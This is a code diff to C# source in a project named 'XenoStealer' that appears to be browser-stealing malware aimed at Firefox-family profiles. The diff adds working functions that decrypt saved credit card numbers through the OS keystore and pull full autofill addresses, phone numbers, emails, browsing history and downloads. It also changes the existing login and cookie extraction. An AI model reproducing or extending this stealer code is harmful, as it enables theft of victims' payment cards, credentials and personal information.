@@ -11,7 +11,6 @@ namespace XenoStealer
 {
     public static class Gecko
     {
-
         public static DataExtractionStructs.GeckoBrowser[] GetAllInfo(GeckoBrowserOptions options) 
         {
             List<DataExtractionStructs.GeckoBrowser> browsers = new List<DataExtractionStructs.GeckoBrowser>();
@@ -19,6 +18,11 @@ namespace XenoStealer
             bool ShouldGetLogins = (options & GeckoBrowserOptions.Logins) == GeckoBrowserOptions.Logins;
             bool ShouldGetCookies = (options & GeckoBrowserOptions.Cookies) == GeckoBrowserOptions.Cookies;
             bool ShouldGetAutofills = (options & GeckoBrowserOptions.Autofills) == GeckoBrowserOptions.Autofills;
+            bool ShouldGetDownloads = (options & GeckoBrowserOptions.Downloads) == GeckoBrowserOptions.Downloads;
+            bool ShouldGetHistory = (options & GeckoBrowserOptions.History) == GeckoBrowserOptions.History;
+            bool shouldGetCreditCards = (options & GeckoBrowserOptions.CreditCards) == GeckoBrowserOptions.CreditCards;
+            bool shouldGetAddresses = (options & GeckoBrowserOptions.Addresses) == GeckoBrowserOptions.Addresses;
+
 
             if (!ShouldGetLogins && !ShouldGetCookies && !ShouldGetAutofills) 
             {
@@ -60,6 +64,11 @@ namespace XenoStealer
                     GeckoLogin[] logins = null;
                     GeckoCookie[] cookies = null;
                     GeckoAutoFill[] autofills = null;
+                    GeckoDownload[] downloads = null;
+                    GeckoHistoryEntry[] history = null;
+                    GeckoCreditCard[] creditCards = null;
+                    GeckoAddressInfo[] addresses = null;
+
 
                     if (GetBrowserLogins) 
                     {
@@ -74,15 +83,33 @@ namespace XenoStealer
                         autofills = GetAutoFills(profilePath);
                     }
 
-                    if (logins == null && cookies == null && autofills == null) 
+                    if (ShouldGetDownloads) 
+                    { 
+                        downloads = GetDownloads(profilePath);
+                    }
+
+                    if (ShouldGetHistory) 
+                    { 
+                        history = GetHistory(profilePath);
+                    }
+
+                    if (shouldGetCreditCards) 
+                    { 
+                        creditCards = GetCreditCards(profilePath);
+                    }
+
+                    if (shouldGetAddresses) 
+                    { 
+                        addresses = GetAddresses(profilePath);
+                    }
+
+                    if (logins == null && cookies == null && autofills == null && downloads == null && history == null && creditCards == null && addresses == null) 
                     {
                         continue;
                     }
 
-                    profiles.Add(new GeckoProfile(logins, cookies, autofills, profileName));
-                    //if ()
+                    profiles.Add(new GeckoProfile(logins, cookies, autofills, downloads, history, creditCards, addresses, profileName));
                 }
-
 
                 decryptor?.Dispose();
 
@@ -91,7 +118,6 @@ namespace XenoStealer
 
             return browsers.ToArray();
         }
-
         public static DataExtractionStructs.GeckoAutoFill[] GetAutoFills(string profilePath) 
         {
             List<DataExtractionStructs.GeckoAutoFill> autoFills = new List<DataExtractionStructs.GeckoAutoFill>();
@@ -201,8 +227,8 @@ namespace XenoStealer
                     string value = (string)value_obj;
                     string path = (string)path_obj;
                     int expiry = (int)expiry_obj;
-                    bool secure = (int)secure_obj != 0;
-                    bool httpOnly = (int)httpOnly_obj != 0;
+                    bool secure = (int)secure_obj == 1;
+                    bool httpOnly = (int)httpOnly_obj == 1;
                     cookies.Add(new DataExtractionStructs.GeckoCookie(host, path, name, value, expiry, secure, httpOnly));
                 }
                 catch 
@@ -316,7 +342,7 @@ namespace XenoStealer
                     dynamic[] json_logins = jsonObject["logins"];
                     foreach (dynamic login in json_logins)
                     {
-                        if (login != null && login.ContainsKey("hostname") && login.ContainsKey("encryptedUsername") && login.ContainsKey("encryptedPassword"))
+                        if (login != null && login.GetType() == typeof(Dictionary<string, object>)  && login.ContainsKey("hostname") && login.ContainsKey("encryptedUsername") && login.ContainsKey("encryptedPassword"))
                         {
                             try
                             {
@@ -404,8 +430,6 @@ namespace XenoStealer
                 }
             }
 
-            parser.reset();
-
             if (!parser.ReadTable("moz_places"))
             {
                 return null;
@@ -437,6 +461,254 @@ namespace XenoStealer
             }
 
             return downloads.ToArray();
+        }
+        public static DataExtractionStructs.GeckoHistoryEntry[] GetHistory(string profilePath) 
+        {
+            List<DataExtractionStructs.GeckoHistoryEntry> history = new List<DataExtractionStructs.GeckoHistoryEntry>();
+            string db_location = Path.Combine(profilePath, "places.sqlite");
+            if (!File.Exists(db_location))
+            {
+                return null;
+            }
+
+            byte[] fileBytes = Utils.ForceReadFile(db_location);
+            if (fileBytes == null)
+            {
+                return null;
+            }
+            SqlLite3Parser parser;
+            try
+            {
+                parser = new SqlLite3Parser(fileBytes);
+            }
+            catch
+            {
+                return null;
+            }
+            if (!parser.ReadTable("moz_places"))
+            {
+                return null;
+            }
+
+            for (int i = 0; i < parser.GetRowCount(); i++) 
+            {
+                object url_obj = parser.GetValue(i, "url");
+                object hidden_obj = parser.GetValue(i, "hidden");
+                if (url_obj.GetType() != typeof(string) || hidden_obj.GetType() != typeof(int)) 
+                {
+                    continue;
+                }
+                string url = (string)url_obj;
+                bool hidden = (int)hidden_obj == 1;
+
+                if (hidden) 
+                {
+                    continue;
+                }
+
+                history.Add(new GeckoHistoryEntry(url));
+
+            }
+            history.Reverse();//make it display newest first, oldest last.
+            return history.ToArray();
+        }
+        public static DataExtractionStructs.GeckoCreditCard[] GetCreditCards(string profilePath) 
+        {
+            List<DataExtractionStructs.GeckoCreditCard> creditCards = new List<GeckoCreditCard>();
+            string json_location = Path.Combine(profilePath, "autofill-profiles.json");
+            if (!File.Exists(json_location))
+            {
+                return null;
+            }
+
+
+            string jsonText = Utils.ForceReadFileString(json_location);
+
+            if (jsonText == null)
+            {
+                return null;
+                //fail.
+            }
+
+            dynamic jsonObject;
+
+            try
+            {
+                JavaScriptSerializer serializer = new JavaScriptSerializer();
+                jsonObject = serializer.Deserialize<dynamic>(jsonText);
+            }
+            catch
+            {
+                return null;
+                //fail.
+            }
+
+            if (jsonObject==null || jsonObject.GetType() != typeof(Dictionary<string, object>) || !jsonObject.ContainsKey("creditCards")) 
+            {
+                return null;
+            }
+
+            jsonObject = jsonObject["creditCards"];
+
+            if (jsonObject.GetType() != typeof(object[])) 
+            {
+                return null;
+            }
+
+            foreach (object i in jsonObject)
+            {
+                if (i.GetType() != typeof(Dictionary<string, object>))
+                {
+                    return null;
+                }
+
+                Dictionary<string, object> cardData = (Dictionary<string, object>)i;
+
+                if (!cardData.ContainsKey("cc-exp-month") || cardData["cc-exp-month"].GetType() != typeof(int) || !cardData.ContainsKey("cc-exp-year") || cardData["cc-exp-year"].GetType() != typeof(int) || !cardData.ContainsKey("cc-name") || cardData["cc-name"].GetType() != typeof(string) || !cardData.ContainsKey("cc-type") || cardData["cc-type"].GetType() != typeof(string) || !cardData.ContainsKey("cc-number-encrypted") || cardData["cc-number-encrypted"].GetType() != typeof(string))
+                {
+                    continue;
+                }
+                string name = (string)cardData["cc-name"];
+                string type = (string)cardData["cc-type"];
+                int month = (int)cardData["cc-exp-month"];
+                int year = (int)cardData["cc-exp-year"];
+
+                string EncryptedCard = (string)cardData["cc-number-encrypted"];
+
+                string MOZAPPBASENAME = GeckoDecryptor.GetMOZAPPBASENAMEFromProfilePath(profilePath);
+
+                if (MOZAPPBASENAME == null)
+                {
+                    return null;
+                }
+
+                byte[] cardBuffer = GeckoDecryptor.OsKeyStoreDecrypt(MOZAPPBASENAME, EncryptedCard);
+
+                if (cardBuffer == null) 
+                {
+                    return null;
+                }
+
+                string cardNumber = Encoding.UTF8.GetString(cardBuffer);
+
+                creditCards.Add(new DataExtractionStructs.GeckoCreditCard(name, type, cardNumber, month, year));
+
+            }
+            return creditCards.ToArray();
+
+        }
+        public static DataExtractionStructs.GeckoAddressInfo[] GetAddresses(string profilePath) 
+        {
+            List<DataExtractionStructs.GeckoAddressInfo> addresses = new List<GeckoAddressInfo>();
+            string json_location = Path.Combine(profilePath, "autofill-profiles.json");
+            if (!File.Exists(json_location))
+            {
+                return null;
+            }
+
+
+            string jsonText = Utils.ForceReadFileString(json_location);
+
+            if (jsonText == null)
+            {
+                return null;
+                //fail.
+            }
+
+            dynamic jsonObject;
+
+            try
+            {
+                JavaScriptSerializer serializer = new JavaScriptSerializer();
+                jsonObject = serializer.Deserialize<dynamic>(jsonText);
+            }
+            catch
+            {
+                return null;
+                //fail.
+            }
+
+            if (jsonObject == null || jsonObject.GetType() != typeof(Dictionary<string, object>) || !jsonObject.ContainsKey("addresses"))
+            {
+                return null;
+            }
+
+            jsonObject = jsonObject["addresses"];
+
+            if (jsonObject.GetType() != typeof(object[]))
+            {
+                return null;
+            }
+
+            foreach (object i in jsonObject)
+            {
+                if (i.GetType() != typeof(Dictionary<string, object>))
+                {
+                    return null;
+                }
+
+                Dictionary<string, object> addressData = (Dictionary<string, object>)i;
+
+                if (!addressData.ContainsKey("name") || addressData["name"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("organization") || addressData["organization"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("street-address") || addressData["street-address"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("address-level2") || addressData["address-level2"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("address-level1") || addressData["address-level1"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("postal-code") || addressData["postal-code"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("country") || addressData["country"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("tel") || addressData["tel"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("email") || addressData["email"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("given-name") || addressData["given-name"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("additional-name") || addressData["additional-name"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("family-name") || addressData["family-name"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("address-line1") || addressData["address-line1"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("address-line2") || addressData["address-line2"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("address-line3") || addressData["address-line3"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("country-name") || addressData["country-name"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("tel-national") || addressData["tel-national"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("tel-country-code") || addressData["tel-country-code"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("tel-area-code") || addressData["tel-area-code"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("tel-local") || addressData["tel-local"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("tel-local-prefix") || addressData["tel-local-prefix"].GetType() != typeof(string) ||
+                    !addressData.ContainsKey("tel-local-suffix") || addressData["tel-local-suffix"].GetType() != typeof(string))
+                {
+                    return null;
+                }
+
+
+                string name = (string)addressData["name"];
+                string organization = (string)addressData["organization"];
+                string streetAddress = (string)addressData["street-address"];
+                string addressLevel2 = (string)addressData["address-level2"];
+                string addressLevel1 = (string)addressData["address-level1"];
+                string postalCode = (string)addressData["postal-code"];
+                string country = (string)addressData["country"];
+                string tel = (string)addressData["tel"];
+                string email = (string)addressData["email"];
+                string givenName = (string)addressData["given-name"];
+                string additionalName = (string)addressData["additional-name"];
+                string familyName = (string)addressData["family-name"];
+                string addressLine1 = (string)addressData["address-line1"];
+                string addressLine2 = (string)addressData["address-line2"];
+                string addressLine3 = (string)addressData["address-line3"];
+                string countryName = (string)addressData["country-name"];
+                string telNational = (string)addressData["tel-national"];
+                string telCountryCode = (string)addressData["tel-country-code"];
+                string telAreaCode = (string)addressData["tel-area-code"];
+                string telLocal = (string)addressData["tel-local"];
+                string telLocalPrefix = (string)addressData["tel-local-prefix"];
+                string telLocalSuffix = (string)addressData["tel-local-suffix"];
+
+
+                addresses.Add(new DataExtractionStructs.GeckoAddressInfo(
+                    name, organization, streetAddress, addressLevel2, addressLevel1, postalCode, country, tel, email,
+                    givenName, additionalName, familyName, addressLine1, addressLine2, addressLine3, countryName,
+                    telNational, telCountryCode, telAreaCode, telLocal, telLocalPrefix, telLocalSuffix));
+
+            }
+
+            return addresses.ToArray();
+
         }
 
     }
